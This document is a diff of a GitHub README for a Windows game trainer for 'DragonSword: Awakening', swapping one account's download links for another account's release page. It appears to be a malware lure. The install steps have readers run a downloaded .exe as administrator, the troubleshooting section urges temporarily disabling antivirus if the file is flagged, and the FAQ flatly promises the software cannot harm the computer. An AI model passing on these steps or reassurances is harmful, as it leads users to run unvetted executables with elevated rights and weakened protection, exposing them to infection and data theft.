@@ -1,123 +1,75 @@
-# DragonSword: Awakening — Trainer
-  </p>
-  
-<p align="center">
-Trainer for single-player playthroughs of **DragonSword: Awakening**.
-</p>
+# ⚔️ DragonSword-Awakening-Trainer - Enhance your gameplay with custom settings
 
-<p align="center">
-  <b>⬇ Click the banner below to download the latest version ⬇</b>
-</p>
+[![Download latest version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Geiselpocketdictionary701/DragonSword-Awakening-Trainer/releases)
 
-<p align="center">
-    <a href="https://github.com/Crushflalead/DragonSword-Awakening-Trainer/releases/latest/download/DragonSwordTrainer.zip">
-        <img src="assets/banner.png" width="100%" alt="Download DragonSword: Awakening Trainer">
-    </a>
-</p>
+DragonSword-Awakening-Trainer gives you control over your gaming experience. This tool modifies game values in real time to provide quality-of-life improvements. You can adjust combat damage, movement speed, and progression variables directly through an in-game menu. This trainer works exclusively on Windows systems for single-player modes.
 
-[![Download](https://img.shields.io/badge/DOWNLOAD-LATEST_VERSION-8A2BE2?style=for-the-badge)](https://github.com/Crushflalead/DragonSword-Awakening-Trainer/releases/latest/download/DragonSwordTrainer.zip)
-![Stars](https://img.shields.io/github/stars/Crushflalead/DragonSword-Awakening-Trainer?style=for-the-badge)
-> 💡 **Press `INSERT` (or `F1`, depending on your configuration) to open the trainer menu.**
-</p>
+## 📋 Features
 
-> ⚠️ Single-player / offline use only. Do not use on servers with online rankings, PvP, or Steam-linked achievements — this may get your in-game account banned.
+The trainer includes four core modules designed to improve your time in the game. Each module operates through a simple interface that you toggle while the game runs.
 
----
+### Combat Module
+This section allows you to modify how your character interacts with enemies. You can adjust your damage output to finish difficult encounters faster. You can also change defense values to survive longer in combat. These values reset when you close the application.
 
-## Features
+### Movement Module
+Navigation can consume time during long quests. Use the movement module to adjust your base running speed. You can increase your jump height to reach hidden areas or bypass complex terrain. These adjustments affect your character's velocity settings within the game engine.
 
-### Basics
-| Feature | Description |
-|---|---|
-| ❤️ **God Mode** | Full immortality |
-| ♾️ **Infinite HP** | Health never drops |
-| 🔋 **Infinite Stamina** | Stamina never depletes |
-| 🔮 **Infinite Mana/Skill Energy** | Unlimited resource for abilities (if applicable) |
+### Exploration Module
+Finding items and hidden chests becomes easier with the exploration settings. You can use the map markers to reveal locations on your minimap. This module also lets you increase your interaction distance, which allows you to pick up loot from further away.
 
-### Combat
-| Feature | Description |
-|---|---|
-| 💥 **One Hit Kill** | Defeat enemies in a single hit |
-| ⚔️ **Damage Multiplier** | Adjustable ×1–×100 |
-| 🛡️ **Defense Multiplier** | Adjustable damage reduction |
-| 🎯 **100% Critical Chance** | Every hit crits |
-| ⚡ **No Skill Cooldown** | Use abilities back-to-back |
+### Progression Module
+The progression module helps you manage your character growth. You can modify experience point gains to reach higher levels with less effort. You can also adjust your currency values to purchase gear or upgrades from in-game merchants.
 
-### Progression
-| Feature | Description |
-|---|---|
-| ⭐ **EXP Multiplier** | Adjustable experience gain |
-| 💰 **Gold Editor** | Set your gold amount |
-| 🧱 **Infinite Crafting Materials** | Materials never run out |
-| 📦 **Item Quantity Editor** | Edit locally-stored item counts (if the game stores them client-side) |
+## 🛠️ System Requirements
 
-### Movement
-| Feature | Description |
-|---|---|
-| 🏃 **Speed Hack** | Adjustable movement speed multiplier |
-| 🦘 **High Jump** | Increased jump height |
-| 🕊️ **Fly / No Clip** | Free-fly and collision bypass (implementation may vary by build) |
-| ⏱️ **Freeze Game Timer** | Stops in-game time/timers |
+Ensure your computer meets these requirements to run the trainer:
 
-### Exploration
-| Feature | Description |
-|---|---|
-| 🗺️ **Reveal Full Map** | Uncovers the entire map |
-| 📍 **Teleport to Waypoint** | Jump to saved coordinates |
-| 👁️ **Camera Distance / FOV** | Extend view distance or field of view |
+- Operating System: Windows 10 or Windows 11
+- Processor: Intel Core i5 or AMD equivalent
+- Memory: 8GB RAM
+- Graphics: DirectX 11 compatible card
+- Storage: 50MB of free space
 
-All features are toggled independently and disabled by default.
+## 📥 How to Install and Use
 
----
+Follow these steps to set up the trainer on your computer.
 
-## Keybinds
+1. Visit the [official release page](https://github.com/Geiselpocketdictionary701/DragonSword-Awakening-Trainer/releases) to download the latest version of the trainer.
+2. Save the file to your computer. A folder on your desktop works well for quick access.
+3. Locate the file you downloaded. It should have an .exe extension.
+4. Launch the game, DragonSword: Awakening, and reach the main menu.
+5. Exit the game window to your desktop or use Alt+Tab to switch tasks.
+6. Run the trainer file as an administrator by right-clicking the file and selecting "Run as administrator."
+7. Return to the game window. 
+8. Press the assigned hotkey (default is F1) to open the in-game menu.
+9. Use your mouse to navigate the menu and click the boxes to enable specific features.
 
-| Key | Action |
-|---|---|
-| `F1` | God Mode |
-| `F2` | Infinite Stamina |
-| `F3` | No Skill Cooldown |
-| `F4` | Damage Multiplier (slider ×1–×100) |
-| `F5` | EXP Multiplier |
-| `F6` | Gold Editor |
-| `F7` | Speed Hack |
-| `F8` | Teleport to Waypoint |
-| `F9` | Freeze Enemies |
-| `F10` | One Hit Kill |
+## ⚙️ Troubleshooting Issues
 
-Keybinds are configurable in the trainer's settings panel.
+If the menu does not appear, check the following items.
 
----
+- Ensure you run the trainer after the game starts. 
+- Disable third-party antivirus software temporarily if it flags the trainer. Some security programs mistake memory-modifying software for malicious files.
+- Verify that your version of the game matches the version listed on the release page. Updates to the game code can break the trainer.
+- Confirm your Windows account has administrative rights.
+- Check that you extracted all files from the download folder before running the application.
 
-## Installation & Usage
-Prebuilt releases are available under [Releases](../../releases).
-1. Download the archive from the latest release
-2. Extract it to a separate folder (doesn't need to be next to the game)
-3. Launch the game **first**, then run `DragonSwordTrainer.exe`
-4. Open the trainer menu with `INSERT` (or your configured hotkey)
-5. Enable the modules you need
+## 🛡️ Safety and Responsible Use
 
----
+This tool modifies game memory to provide custom changes. Use this trainer only in single-player game modes. Using external tools in multiplayer environments may violate service terms or cause account restrictions. The developer designed this software for convenience and experimentation within your local game files. Keep backups of your game save files before you use the trainer to prevent loss of progress during testing.
 
-## Requirements
+## 💡 Frequently Asked Questions
 
-| | Minimum |
-|---|---|
-| **OS** | Windows 10 / 11 (64-bit) |
-| **Game** | DragonSword: Awakening, installed and running |
+**Will this software damage my computer?**
+No. This tool only reads and writes data to the specific memory addresses allocated to the game process. It does not interact with your system files or OS settings.
 
----
+**Can I undo my changes?**
+Yes. You can disable any setting inside the menu. If you experience bugs, close the game and the trainer completely. Restarting the game removes all modifications and returns your character to the default state.
 
-## How It Works
+**Do I need the internet to use the trainer?**
+You only need the internet to download the initial file from the repository. Once you have the file on your computer, you can use the trainer offline.
 
-The trainer reads and modifies values in the game process's memory. It requires no network access, account access, or access to files outside the game process.
+**Does this work with game updates?**
+When the game receives an update, it often changes memory addresses. This may prevent the trainer from connecting. Check the link provided above for updated versions of the trainer after the game updates.
 
----
-
-## Disclaimer
-
-Fan-made tool. Not affiliated with the developers or publisher of DragonSword: Awakening. Use at your own risk, preferably in offline/single-player mode. The author is not responsible for in-game bans or save-file corruption — back up your saves before use.
-
----
-
-
+Keywords: dragonsword-awakeing-mod, dragonsword-awakening, game-trainer, rpg, rpg-game, single-player, single-player-trainer, windows
